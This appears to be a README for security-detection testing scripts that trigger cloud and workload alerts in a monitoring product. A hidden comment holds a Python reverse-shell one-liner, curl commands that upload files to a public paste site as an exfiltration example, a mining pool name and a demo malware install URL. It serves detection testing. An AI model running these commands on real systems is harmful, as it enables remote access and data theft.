<!--
```
testing scripts
	aws known bad
		high volume of unauthorized api calls
		iam access key changes

	aws anomaly
		reconnaissance
		malicious changes

	workload known bad
		crypto mining
		reverse shell
		port scanning

	workload anomaly
		new external traffic
		new internal traffic
		new binaries / children


aws script
	√reconnaissance (+ high vol unauth calls)
	√malicious changes


workload
	√crypto mining
	√reverse shell
	√port scanning (new internal traffic)
	√data exfil example -> pastebin
		 curl --upload-file ~/Downloads/Bike.dmg https://paste.c-net.org/
		dd if=/dev/urandom of=/tmp/test.5mb bs=1024 count=5000 && curl --upload-file /tmp/test.5mb https://paste.c-net.org/

traffic generator app


python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

pool.minexmr.com
lwmalwaredemo.com
http://lwmalwaredemo.com/install-demo-1.sh

```
-->
# Lacework Testing Scripts

## Summary

## Testing Scenarios

### AWS

| Script | Alerting Types | Instructions |
| ------ | -------------- | ------------ |
| [aws-recon.sh](./aws-recon.sh) | Anomaly & Known-bad | Dependencies: `aws` cli tool.<br/><br/>Using *an existing IAM user* or on an instance provisioned with an instance profile known to Lacework, you may execute this script to generate a high volume of (read-only) API calls to AWS across many different services (EC2, Secrets Manager, RDS, IAM, KMS).  Depending on the permissions of your user, you will see either anomaly-only alerts, OR anomalies + policy alerts if this activity generates a high number of access-denied errors.<br/><br/>To provide permissions to the `aws` cli tool, either run this from an EC2 host with privileges assigned as an instance profile, OR run this script with environment variables set for some combination of `AWS_PROFILE`, or `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`. |
| [aws-iam-s3-activity.sh](./aws-iam-s3-activity.sh) | Anomaly & Known-bad | Dependencies: `aws` cli tool.<br/><br/>Using *an existing IAM user* or on an instance provisioned with an instance profile known to Lacework, you may execute this script to generate activity in the form of creating an IAM user, assigning policy, creating and uploading content to an S3 bucket, and deleting the S3 bucket, and IAM user.  This will require administrator level permissions. The alerts generated will be a combination of policy & anomaly based alerts. <br/><br/>To provide permissions to the `aws` cli tool, either run this from an EC2 host with privileges assigned as an instance profile, OR run this script with environment variables set for some combination of `AWS_PROFILE`, or `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`. |

### Workloads

| Script | Alerting Types | Instructions |
| ------ | -------------- | ------------ |
| [reverse-shell.sh](./reverse-shell.sh) | Anomaly & Known-bad |  |
| [xmrig.sh](./xmrig.sh) | Known-bad |  |
| [data-exfil.sh](./xmrig.sh) | Anomaly |  |
| port-scan.sh | Anomaly & Known-bad |  |
| Testing Appliance | Special |  |